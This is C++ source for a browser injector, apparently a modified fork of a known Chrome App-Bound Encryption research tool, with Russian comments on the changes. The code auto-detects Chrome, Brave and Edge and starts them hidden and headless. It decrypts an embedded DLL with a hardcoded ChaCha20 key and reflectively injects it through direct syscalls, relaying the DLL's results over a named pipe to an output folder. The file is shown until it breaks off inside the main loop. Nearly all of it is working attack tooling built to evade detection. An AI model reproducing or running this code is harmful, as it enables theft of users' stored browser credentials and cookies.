// chrome_inject.cpp
// v0.14.0 (c) Alexander 'xaitax' Hagenah, modified for automatic browser detection and default browser start
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include <Windows.h>
#include <tlhelp32.h>
#include <Rpc.h>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <algorithm>
#include <optional>
#include <map>
#include <memory>
#include "syscalls.h"
#include <cstdint>

#define CHACHA20_IMPLEMENTATION
#include "..\libs\chacha\chacha20.h"

#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")

#ifndef IMAGE_FILE_MACHINE_ARM64
#define IMAGE_FILE_MACHINE_ARM64 0xAA64
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

static const uint8_t g_decryptionKey[32] = {
    0x1B, 0x27, 0x55, 0x64, 0x73, 0x8B, 0x9F, 0x4D,
    0x58, 0x4A, 0x7D, 0x67, 0x8C, 0x79, 0x77, 0x46,
    0xBE, 0x6B, 0x4E, 0x0C, 0x54, 0x57, 0xCD, 0x95,
    0x18, 0xDE, 0x7E, 0x21, 0x47, 0x66, 0x7C, 0x94};

static const uint8_t g_decryptionNonce[12] = {
    0x4A, 0x51, 0x78, 0x62, 0x8D, 0x2D, 0x4A, 0x54,
    0x88, 0xE5, 0x3C, 0x50};

namespace fs = std::filesystem;

constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
constexpr DWORD BROWSER_INIT_WAIT_MS = 3000;
constexpr DWORD INJECTOR_REMOTE_THREAD_WAIT_MS = 15000;

struct HandleGuard
{
    HANDLE h_ = nullptr;
    HandleGuard() = default;
    explicit HandleGuard(HANDLE h) : h_((h == INVALID_HANDLE_VALUE) ? nullptr : h) {}
    ~HandleGuard()
    {
        if (h_)
            CloseHandle(h_);
    }
    HANDLE get() const { return h_; }
    void reset(HANDLE h = nullptr)
    {
        if (h_)
            CloseHandle(h_);
        h_ = (h == INVALID_HANDLE_VALUE) ? nullptr : h;
    }
    explicit operator bool() const { return h_ != nullptr; }
    HandleGuard(const HandleGuard &) = delete;
    HandleGuard &operator=(const HandleGuard &) = delete;
    HandleGuard(HandleGuard &&other) noexcept : h_(other.h_) { other.h_ = nullptr; }
    HandleGuard &operator=(HandleGuard &&other) noexcept
    {
        if (this != &other)
        {
            if (h_)
                CloseHandle(h_);
            h_ = other.h_;
            other.h_ = nullptr;
        }
        return *this;
    }
};

namespace Injector
{
    // MODIFIED: Удалено поле autoStartBrowser, browserType не нужно
    struct Configuration
    {
        bool verbose = false;
        fs::path outputPath;
        std::string browserDisplayName;
        std::wstring browserProcessName;
        std::wstring browserDefaultExePath;
    };

    namespace UI
    {
        static bool g_verbose = false;

        void EnableVerboseMode(bool enabled) { g_verbose = enabled; }

        void LogDebug(const std::string &msg)
        {
            if (!g_verbose)
                return;
            HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN);
            std::cout << "[#] " << msg << std::endl;
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        }

        void PrintStatus(const std::string &tag, const std::string &msg)
        {
            HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
            CONSOLE_SCREEN_BUFFER_INFO console_info;
            GetConsoleScreenBufferInfo(hConsole, &console_info);
            WORD original_attributes = console_info.wAttributes;

            WORD col = original_attributes;
            if (tag == "[+]")
                col = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
            else if (tag == "[-]")
                col = FOREGROUND_RED | FOREGROUND_INTENSITY;
            else if (tag == "[*]")
                col = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
            else if (tag == "[!]")
                col = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;

            SetConsoleTextAttribute(hConsole, col);
            std::cout << tag;
            SetConsoleTextAttribute(hConsole, original_attributes);
            std::cout << " " << msg << std::endl;
        }

        void DisplayBanner()
        {
            HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        }

        // MODIFIED: Обновлен вывод справки, убрано упоминание -s и browser_type
        void PrintUsage()
        {
            HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
            std::cout << "Usage: chrome_inject.exe [-v|--verbose] [-o|--output-path <path>] [-h|--help]\n";
            std::cout << "Options:\n";
            std::cout << "  -v, --verbose        Enable verbose output\n";
            std::cout << "  -o, --output-path    Specify output directory\n";
            std::cout << "  -h, --help           Display this help message\n";
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        }
    }

    namespace Utils
    {
        std::string WStringToUtf8(std::wstring_view w_sv)
        {
            if (w_sv.empty())
                return {};
            int size_needed = WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), nullptr, 0, nullptr, nullptr);
            std::string utf8_str(size_needed, '\0');
            WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), &utf8_str[0], size_needed, nullptr, nullptr);
            return utf8_str;
        }

        struct EmbeddedResource
        {
            LPVOID pData;
            DWORD dwSize;
        };

        std::optional<EmbeddedResource> GetEmbeddedResource(LPCWSTR lpName, LPCWSTR lpType)
        {
            HMODULE hModule = GetModuleHandle(NULL);
            HRSRC hResInfo = FindResourceW(hModule, lpName, lpType);
            if (hResInfo == NULL)
            {
                UI::PrintStatus("[-]", "FindResource failed. Error: " + std::to_string(GetLastError()));
                return std::nullopt;
            }

            HGLOBAL hResData = LoadResource(hModule, hResInfo);
            if (hResData == NULL)
            {
                UI::PrintStatus("[-]", "LoadResource failed. Error: " + std::to_string(GetLastError()));
                return std::nullopt;
            }

            LPVOID pData = LockResource(hResData);
            DWORD dwSize = SizeofResource(hModule, hResInfo);

            if (pData == NULL || dwSize == 0)
            {
                return std::nullopt;
            }

            UI::LogDebug("Successfully loaded embedded resource '" + WStringToUtf8(lpName) + "'. Size: " + std::to_string(dwSize) + " bytes.");
            return EmbeddedResource{pData, dwSize};
        }

        void ChaCha20Decrypt(std::vector<BYTE> &data)
        {
            if (data.empty())
                return;
            chacha20_xor(g_decryptionKey, g_decryptionNonce, data.data(), data.size(), 0);
        }

        std::wstring GenerateUniquePipeName()
        {
            UUID uuid;
            UuidCreate(&uuid);
            wchar_t *uuidStrRaw = nullptr;
            UuidToStringW(&uuid, (RPC_WSTR *)&uuidStrRaw);
            std::wstring pipeName = L"\\\\.\\pipe\\";
            pipeName += uuidStrRaw;
            RpcStringFreeW((RPC_WSTR *)&uuidStrRaw);
            return pipeName;
        }

        std::string PtrToHexStr(const void *ptr)
        {
            std::ostringstream oss;
            oss << "0x" << std::hex << reinterpret_cast<uintptr_t>(ptr);
            return oss.str();
        }

        std::string NtStatusToString(NTSTATUS status)
        {
            std::ostringstream oss;
            oss << "0x" << std::hex << status;
            return oss.str();
        }

        std::string Capitalize(std::string s)
        {
            if (!s.empty())
            {
                s[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(s[0])));
            }
            return s;
        }
    }

    namespace Process
    {
        constexpr USHORT MyArch =
#if defined(_M_IX86)
            IMAGE_FILE_MACHINE_I386
#elif defined(_M_X64)
            IMAGE_FILE_MACHINE_AMD64
#elif defined(_M_ARM64)
            IMAGE_FILE_MACHINE_ARM64
#else
            IMAGE_FILE_MACHINE_UNKNOWN
#endif
            ;

        const char *ArchName(USHORT m)
        {
            switch (m)
            {
            case IMAGE_FILE_MACHINE_I386:
                return "x86";
            case IMAGE_FILE_MACHINE_AMD64:
                return "x64";
            case IMAGE_FILE_MACHINE_ARM64:
                return "ARM64";
            default:
                return "Unknown";
            }
        }

        bool GetProcessArchitecture(HANDLE hProc, USHORT &arch)
        {
            auto fnIsWow64Process2 = (decltype(&IsWow64Process2))GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "IsWow64Process2");
            if (fnIsWow64Process2)
            {
                USHORT processMachine = 0, nativeMachine = 0;
                if (!fnIsWow64Process2(hProc, &processMachine, &nativeMachine))
                    return false;
                arch = (processMachine == IMAGE_FILE_MACHINE_UNKNOWN) ? nativeMachine : processMachine;
                return true;
            }
            BOOL isWow64 = FALSE;
            if (!IsWow64Process(hProc, &isWow64))
                return false;
#if defined(_M_X64)
            arch = isWow64 ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_AMD64;
#elif defined(_M_ARM64)
            arch = isWow64 ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_ARM64;
#elif defined(_M_IX86)
            arch = IMAGE_FILE_MACHINE_I386;
#else
            return false;
#endif
            return true;
        }

        bool CheckArchMatch(HANDLE hProc)
        {
            USHORT targetArch = 0;
            if (!GetProcessArchitecture(hProc, targetArch))
            {
                return false;
            }
            if (targetArch != MyArch)
            {
                return false;
            }
            UI::LogDebug("Architecture match: Injector=" + std::string(ArchName(MyArch)) + ", Target=" + std::string(ArchName(targetArch)));
            return true;
        }

        std::optional<DWORD> GetProcessIdByName(const std::wstring &procName)
        {
            UI::LogDebug("Snapshotting processes for " + Utils::WStringToUtf8(procName));
            HandleGuard snap(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
            if (!snap)
                return std::nullopt;

            PROCESSENTRY32W entry{};
            entry.dwSize = sizeof(entry);
            if (Process32FirstW(snap.get(), &entry))
            {
                do
                {
                    if (procName == entry.szExeFile)
                    {
                        UI::LogDebug("Found process " + Utils::WStringToUtf8(procName) + " PID=" + std::to_string(entry.th32ProcessID));
                        return entry.th32ProcessID;
                    }
                } while (Process32NextW(snap.get(), &entry));
            }
            return std::nullopt;
        }

        std::string GetProcessVersion(const std::wstring &exePath)
        {
            DWORD handle = 0;
            DWORD versionInfoSize = GetFileVersionInfoSizeW(exePath.c_str(), &handle);
            if (versionInfoSize == 0)
                return "N/A";

            std::vector<BYTE> versionData(versionInfoSize);
            if (!GetFileVersionInfoW(exePath.c_str(), 0, versionInfoSize, versionData.data()))
                return "N/A";

            UINT ffiLen = 0;
            VS_FIXEDFILEINFO *ffi = nullptr;
            if (VerQueryValueW(versionData.data(), L"\\", (LPVOID *)&ffi, &ffiLen) && ffi)
            {
                return std::to_string(HIWORD(ffi->dwProductVersionMS)) + "." +
                       std::to_string(LOWORD(ffi->dwProductVersionMS)) + "." +
                       std::to_string(HIWORD(ffi->dwProductVersionLS)) + "." +
                       std::to_string(LOWORD(ffi->dwProductVersionLS));
            }
            return "N/A";
        }

        bool StartProcess(const std::wstring &exePath, DWORD &outPid)
        {
            HANDLE hNull = CreateFileW(L"NUL:", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                       NULL, OPEN_EXISTING, 0, NULL);
            if (hNull == INVALID_HANDLE_VALUE)
            {
                UI::LogDebug("Failed to open NUL device for output redirection. Error: " + std::to_string(GetLastError()));
                return false;
            }
            HandleGuard nullGuard(hNull);

            STARTUPINFOW si{};
            PROCESS_INFORMATION pi{};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
            si.wShowWindow = SW_HIDE;
            si.hStdInput = hNull;
            si.hStdOutput = hNull;
            si.hStdError = hNull;

            std::wstring cmdLine = L"\"" + exePath + L"\" --headless --disable-logging --log-level=3 --v=0";

            if (!CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi))
            {
                UI::LogDebug("CreateProcessW failed. Error: " + std::to_string(GetLastError()));
                return false;
            }
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            UI::LogDebug("Waiting " + std::to_string(BROWSER_INIT_WAIT_MS / 1000) + "s for browser to initialize...");
            Sleep(BROWSER_INIT_WAIT_MS);
            outPid = pi.dwProcessId;
            return true;
        }
    }

    namespace RDI
    {
        DWORD RvaToOffset(DWORD rva, PIMAGE_NT_HEADERS64 ntHeaders, LPCVOID fileBase)
        {
            PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
            for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
            {
                if (rva >= sectionHeader[i].VirtualAddress && rva < (sectionHeader[i].VirtualAddress + sectionHeader[i].SizeOfRawData))
                {
                    return (rva - sectionHeader[i].VirtualAddress) + sectionHeader[i].PointerToRawData;
                }
            }
            return 0;
        }

        DWORD GetReflectiveLoaderFileOffset(LPCVOID fileBuffer, USHORT expectedMachine)
        {
            PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
            if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
                return 0;

            PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((ULONG_PTR)fileBuffer + dosHeader->e_lfanew);
            if (ntHeaders->Signature != IMAGE_NT_SIGNATURE || ntHeaders->FileHeader.Machine != expectedMachine || ntHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
                return 0;

            PIMAGE_DATA_DIRECTORY exportDataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            if (exportDataDir->VirtualAddress == 0)
                return 0;

            DWORD exportDirOffset = RvaToOffset(exportDataDir->VirtualAddress, ntHeaders, fileBuffer);
            PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)fileBuffer + exportDirOffset);

            DWORD *namesRva = (DWORD *)((ULONG_PTR)fileBuffer + RvaToOffset(exportDir->AddressOfNames, ntHeaders, fileBuffer));
            WORD *ordinals = (WORD *)((ULONG_PTR)fileBuffer + RvaToOffset(exportDir->AddressOfNameOrdinals, ntHeaders, fileBuffer));
            DWORD *funcsRva = (DWORD *)((ULONG_PTR)fileBuffer + RvaToOffset(exportDir->AddressOfFunctions, ntHeaders, fileBuffer));

            for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
            {
                char *funcName = (char *)((ULONG_PTR)fileBuffer + RvaToOffset(namesRva[i], ntHeaders, fileBuffer));
                if (strcmp(funcName, "ReflectiveLoader") == 0)
                {
                    return RvaToOffset(funcsRva[ordinals[i]], ntHeaders, fileBuffer);
                }
            }
            return 0;
        }

        bool Inject(HANDLE proc, const std::vector<BYTE> &dllBuffer, USHORT targetArch, LPVOID lpDllParameter)
        {
            DWORD rdiOffset = GetReflectiveLoaderFileOffset(dllBuffer.data(), targetArch);
            if (rdiOffset == 0)
            {
                return false;
            }
            UI::LogDebug("RDI: ReflectiveLoader file offset: " + Utils::PtrToHexStr((void *)(uintptr_t)rdiOffset));

            LPVOID remoteMem = nullptr;
            SIZE_T regionSize = dllBuffer.size();
            NTSTATUS status = NtAllocateVirtualMemory_syscall(proc, &remoteMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!NT_SUCCESS(status))
            {
                UI::PrintStatus("[-]", "RDI: NtAllocateVirtualMemory failed. Status: " + Utils::NtStatusToString(status));
                return false;
            }
            UI::LogDebug("RDI: Memory allocated in target at " + Utils::PtrToHexStr(remoteMem));

            auto remoteMemFreer = [&](LPVOID mem)
            {
                if (mem)
                {
                    SIZE_T sizeToFree = 0;
                    NtFreeVirtualMemory_syscall(proc, &mem, &sizeToFree, MEM_RELEASE);
                }
            };
            std::unique_ptr<void, decltype(remoteMemFreer)> remoteMemGuard(remoteMem, remoteMemFreer);

            SIZE_T bytesWritten = 0;
            status = NtWriteVirtualMemory_syscall(proc, remoteMem, (PVOID)dllBuffer.data(), dllBuffer.size(), &bytesWritten);
            if (!NT_SUCCESS(status))
            {
                return false;
            }

            UI::LogDebug("RDI: Payload written to target memory. Bytes written: " + std::to_string(bytesWritten));

            ULONG oldProtect = 0;
            SIZE_T protectRegionSize = dllBuffer.size();
            status = NtProtectVirtualMemory_syscall(proc, &remoteMem, &protectRegionSize, PAGE_EXECUTE_READ, &oldProtect);

            if (!NT_SUCCESS(status))
            {
                UI::LogDebug("RDI: NtProtectVirtualMemory failed for PAGE_EXECUTE_READ. Status: " + Utils::NtStatusToString(status) + ". Memory remains PAGE_EXECUTE_READWRITE.");
            }
            else
            {
                UI::LogDebug("RDI: Memory permissions changed from 0x" + std::to_string(oldProtect) + " to PAGE_EXECUTE_READ (0x" + std::to_string(PAGE_EXECUTE_READ) + ").");
            }

            ULONG_PTR remoteLoaderAddr = reinterpret_cast<ULONG_PTR>(remoteMem) + rdiOffset;
            UI::LogDebug("RDI: Calculated remote ReflectiveLoader address: " + Utils::PtrToHexStr((void *)remoteLoaderAddr));

            HANDLE hRemoteThread = nullptr;
            status = NtCreateThreadEx_syscall(&hRemoteThread, THREAD_ALL_ACCESS, nullptr, proc, (LPTHREAD_START_ROUTINE)remoteLoaderAddr, lpDllParameter, 0, 0, 0, 0, nullptr);
            if (!NT_SUCCESS(status))
            {
                return false;
            }
            HandleGuard remoteThreadGuard(hRemoteThread);

            UI::LogDebug("RDI: Waiting for remote ReflectiveLoader thread...");
            WaitForSingleObject(remoteThreadGuard.get(), INJECTOR_REMOTE_THREAD_WAIT_MS);

            return true;
        }
    }

    class PipeCommunicator
    {
    public:
        explicit PipeCommunicator(const std::wstring &pipeName) : m_pipeName(pipeName),
                                                                  m_pipeNameUtf8(Utils::WStringToUtf8(pipeName)) {}

        bool Create()
        {
            m_pipeHandle.reset(CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
                                                PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                                                1, 4096, 4096, 0, nullptr));
            if (!m_pipeHandle)
            {
                return false;
            }
            UI::LogDebug("Named pipe server created: " + m_pipeNameUtf8);
            return true;
        }

        bool WaitForConnection()
        {
            UI::LogDebug("Waiting for DLL to connect to named pipe...");
            if (!ConnectNamedPipe(m_pipeHandle.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED)
            {
                return false;
            }
            UI::LogDebug("DLL connected to named pipe.");
            return true;
        }

        bool SendInitialData(bool isVerbose, const fs::path &outputPath)
        {
            std::string verboseStatusMsg = isVerbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE";
            if (!WritePipeMessage(verboseStatusMsg))
                return false;

            std::string outputPathUtf8 = outputPath.u8string();
            if (!WritePipeMessage(outputPathUtf8))
                return false;

            return true;
        }

        void RelayMessagesUntilComplete()
        {
            std::cout << std::endl;

            const std::string dllCompletionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
            DWORD startTime = GetTickCount();
            std::string accumulatedData;
            char buffer[4096];

            while (GetTickCount() - startTime < DLL_COMPLETION_TIMEOUT_MS)
            {
                DWORD bytesAvailable = 0;
                if (!PeekNamedPipe(m_pipeHandle.get(), nullptr, 0, nullptr, &bytesAvailable, nullptr))
                {
                    if (GetLastError() == ERROR_BROKEN_PIPE)
                        break;
                    break;
                }
                if (bytesAvailable == 0)
                {
                    Sleep(100);
                    continue;
                }

                DWORD bytesRead = 0;
                if (!ReadFile(m_pipeHandle.get(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr) || bytesRead == 0)
                {
                    if (GetLastError() == ERROR_BROKEN_PIPE)
                        break;
                    continue;
                }

                buffer[bytesRead] = '\0';
                accumulatedData.append(buffer, bytesRead);

                size_t messageStart = 0;
                size_t nullPos;
                while ((nullPos = accumulatedData.find('\0', messageStart)) != std::string::npos)
                {
                    std::string message = accumulatedData.substr(messageStart, nullPos - messageStart);
                    messageStart = nullPos + 1;

                    if (message == dllCompletionSignal)
                    {
                        UI::LogDebug("DLL completion signal received.");
                        goto end_loop;
                    }
                    if (!message.empty())
                        PrintFormattedMessage(message);
                }
                accumulatedData.erase(0, messageStart);
            }
        end_loop:
            std::cout << std::endl;
        }

    private:
        bool WritePipeMessage(const std::string &msg)
        {
            DWORD bytesWritten = 0;
            if (!WriteFile(m_pipeHandle.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &bytesWritten, nullptr) ||
                bytesWritten != (msg.length() + 1))
            {
                return false;
            }
            UI::LogDebug("Sent message to pipe: " + msg);
            return true;
        }

        void PrintFormattedMessage(const std::string &message)
        {
            HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
            CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
            GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
            WORD originalAttrs = consoleInfo.wAttributes;

            size_t tagStart = message.find('[');
            size_t tagEnd = message.find(']', tagStart);

            if (tagStart != std::string::npos && tagEnd != std::string::npos)
            {
                std::cout << message.substr(0, tagStart);

                std::string tag = message.substr(tagStart, tagEnd - tagStart + 1);
                WORD col = originalAttrs;
                if (tag == "[+]")
                    col = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
                else if (tag == "[-]")
                    col = FOREGROUND_RED | FOREGROUND_INTENSITY;
                else if (tag == "[*]")
                    col = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
                else if (tag == "[!]")
                    col = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;

                SetConsoleTextAttribute(hConsole, col);
                std::cout << tag;

                SetConsoleTextAttribute(hConsole, originalAttrs);
                std::cout << message.substr(tagEnd + 1) << std::endl;
            }
            else
            {
                SetConsoleTextAttribute(hConsole, originalAttrs);
                std::cout << message << std::endl;
            }
        }
        std::wstring m_pipeName;
        std::string m_pipeNameUtf8;
        HandleGuard m_pipeHandle;
    };

    // NEW: Функция для определения установленных браузеров
    std::vector<Configuration> DetectInstalledBrowsers()
    {
        std::vector<Configuration> configs;
        const std::map<std::wstring, std::pair<std::wstring, std::wstring>> browserMap = {
            {L"chrome", {L"chrome.exe", L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"}},
            {L"brave", {L"brave.exe", L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}},
            {L"edge", {L"msedge.exe", L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"}}};

        for (const auto& [browserType, browserInfo] : browserMap)
        {
            const std::wstring& processName = browserInfo.first;
            const std::wstring& exePath = browserInfo.second;
            if (fs::exists(exePath))
            {
                Configuration config;
                config.browserProcessName = processName;
                config.browserDefaultExePath = exePath;
                config.browserDisplayName = Utils::Capitalize(Utils::WStringToUtf8(browserType));
                configs.push_back(config);
                UI::LogDebug("Detected installed browser: " + config.browserDisplayName);
            }
            else
            {
                UI::LogDebug("Browser not found at: " + Utils::WStringToUtf8(exePath));
            }
        }
        return configs;
    }

    // MODIFIED: Обновлена функция ParseArguments
    std::optional<std::vector<Configuration>> ParseArguments(int argc, wchar_t *argv[])
    {
        Configuration baseConfig;
        fs::path customOutputPath;

        for (int i = 1; i < argc; ++i)
        {
            std::wstring_view arg = argv[i];
            if (arg == L"--verbose" || arg == L"-v")
                baseConfig.verbose = true;
            else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
                customOutputPath = argv[++i];
            else if (arg == L"--help" || arg == L"-h")
            {
                UI::PrintUsage();
                return std::nullopt;
            }
            else
            {
                UI::PrintStatus("[!]", "Unknown argument: " + Utils::WStringToUtf8(arg));
                return std::nullopt;
            }
        }

        // Получаем список установленных браузеров
        std::vector<Configuration> configs = DetectInstalledBrowsers();
        if (configs.empty())
        {
            UI::PrintStatus("[-]", "No supported browsers found on the system.");
            return std::nullopt;
        }

        // Применяем параметры verbose и outputPath ко всем конфигурациям
        for (auto& config : configs)
        {
            config.verbose = baseConfig.verbose;
            config.outputPath = customOutputPath.empty() ? fs::current_path() / "output" : fs::absolute(customOutputPath);
        }

        return configs;
    }

    // MODIFIED: Обновлена функция Run для обработки нескольких браузеров
    int Run(int argc, wchar_t *argv[])
    {
        UI::DisplayBanner();

        auto optConfigs = ParseArguments(argc, argv);
        if (!optConfigs)
            return (argc > 1 && (std::wstring_view(argv[1]) == L"--help" || std::wstring_view(argv[1]) == L"-h")) ? 0 : 1;

        std::vector<Configuration> configs = *optConfigs;

        bool anySuccess = false;
        for (const auto& config : configs)
        {
            UI::PrintStatus("[*]", "Processing " + config.browserDisplayName + "...");
            UI::EnableVerboseMode(config.verbose);

            if (!InitializeSyscalls(config.verbose))
            {
                UI::PrintStatus("[-]", "Failed to initialize syscalls for " + config.browserDisplayName);
                continue;
            }

            std::wstring ipcPipeNameW = Utils::GenerateUniquePipeName();
            PipeCommunicator pipe(ipcPipeNameW);
            if (!pipe.Create())
            {
                UI::PrintStatus("[-]", "Failed to create named pipe for " + config.browserDisplayName);
                continue;
            }

            std::error_code ec;
            fs::create_directories(config.outputPath, ec);
            if (ec)
            {
                UI::PrintStatus("[-]", "Failed to create output directory for " + config.browserDisplayName + ": " + ec.message());
                continue;
            }

            DWORD targetPid = 0;
            bool startedByInjector = false;
            if (auto optPid = Process::GetProcessIdByName(config.browserProcessName))
            {
                targetPid = *optPid;
                UI::PrintStatus("[*]", config.browserDisplayName + " is already running with PID=" + std::to_string(targetPid));
            }
            else
            {
                UI::PrintStatus("[*]", config.browserDisplayName + " not running, launching...");
                if (Process::StartProcess(config.browserDefaultExePath, targetPid))
                {
                    startedByInjector = true;
                    std::string version = Process::GetProcessVersion(config.browserDefaultExePath);
                    UI::PrintStatus("[+]", config.browserDisplayName + " started with PID=" + std::to_string(targetPid) + ", version: " + version);
                }
                else
                {
                    UI::PrintStatus("[-]", "Failed to start " + config.browserDisplayName);
                    continue;
                }
            }

            if (targetPid == 0)
            {
                UI::PrintStatus("[-]", "No valid PID for " + config.browserDisplayName);
                continue;
            }

            HandleGuard targetProcess(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPid));
            if (!targetProcess)
            {
                UI::PrintStatus("[-]", "Failed to open process for " + config.browserDisplayName + ". Error: " + std::to_string(GetLastError()));
                continue;
            }

            if (!Process::CheckArchMatch(targetProcess.get()))
            {
                UI::PrintStatus("[-]", "Architecture mismatch for " + config.browserDisplayName);
                continue;
            }

            UI::LogDebug("Loading payload DLL from embedded resource.");
            auto optResource = Utils::GetEmbeddedResource(L"PAYLOAD_DLL", MAKEINTRESOURCEW(10));
            if (!optResource)
            {
                UI::PrintStatus("[-]", "Failed to load embedded resource for " + config.browserDisplayName);
                continue;
            }

            std::vector<BYTE> dllBuffer(optResource->dwSize);
            memcpy(dllBuffer.data(), optResource->pData, optResource->dwSize);

            UI::LogDebug("Decrypting payload in-memory with ChaCha20...");
            Utils::ChaCha20Decrypt(dllBuffer);
            UI::LogDebug("Payload decrypted.");

            LPVOID remotePipeNameAddr = nullptr;
            SIZE_T pipeNameSize = (ipcPipeNameW.length() + 1) * sizeof(wchar_t);

            UI::LogDebug("Calling NtAllocateVirtualMemory_syscall...");
            NTSTATUS statusAlloc = NtAllocateVirtualMemory_syscall(
                targetProcess.get(),
                &remotePipeNameAddr,
                0,
                &pipeNameSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE);
            UI::LogDebug("NtAllocateVirtualMemory_syscall returned " + Utils::NtStatusToString(statusAlloc));
            if (!NT_SUCCESS(statusAlloc))
            {
                UI::PrintStatus("[-]", "NtAllocateVirtualMemory failed for " + config.browserDisplayName);
                continue;
            }

            auto remoteMemFreer = [&](LPVOID mem)
            {
                if (mem)
                {
                    SIZE_T sizeToFree = 0;
                    NtFreeVirtualMemory_syscall(targetProcess.get(), &mem, &sizeToFree, MEM_RELEASE);
                    UI::LogDebug("Freed remote pipe name memory.");
                }
            };
            std::unique_ptr<void, decltype(remoteMemFreer)> remoteMemGuard(remotePipeNameAddr, remoteMemFreer);

            UI::LogDebug("Calling NtWriteVirtualMemory_syscall...");
            NTSTATUS statusWrite = NtWriteVirtualMemory_syscall(
                targetProcess.get(),
                remotePipeNameAddr,
                (PVOID)ipcPipeNameW.c_str(),
                pipeNameSize,
                nullptr);
            UI::LogDebug("NtWriteVirtualMemory_syscall returned " + Utils::NtStatusToString(statusWrite));
            if (!NT_SUCCESS(statusWrite))
            {
                UI::PrintStatus("[-]", "NtWriteVirtualMemory failed for " + config.browserDisplayName);
                continue;
            }

            USHORT targetArch = 0;
            Process::GetProcessArchitecture(targetProcess.get(), targetArch);
            UI::LogDebug("Calling RDI::Inject()...");
            bool injected = RDI::Inject(
                targetProcess.get(),
                dllBuffer,
                targetArch,
                remotePipeNameAddr);
            UI::LogDebug(std::string("RDI::Inject returned ") + (injected ? "true" : "false"));
            if (!injected)
            {
                UI::PrintStatus("[-]", "Reflective DLL Injection failed for " + config.browserDisplayName);
                continue;
            }
            UI::PrintStatus("[+]", "Reflective DLL Injection succeeded for " + config.browserDisplayName);

            if (pipe.WaitForConnection())
            {
                if (pipe.SendInitialData(config.verbose, config.outputPath))
                {
                    pipe.RelayMessagesUntilComplete();
                }
            }

            if (startedByInjector)
            {
                UI::LogDebug("Terminating browser PID=" + std::to_string(targetPid) + " because injector started it.");
                HandleGuard processToKill(OpenProcess(PROCESS_TERMINATE, FALSE, targetPid));
                if (processToKill)
                {
                    TerminateProcess(processToKill.get(), 0);
                    UI::PrintStatus("[*]", config.browserDisplayName + " terminated.");
                }
            }
            else
            {
                UI::LogDebug("Browser was already running; injector will not terminate it.");
            }

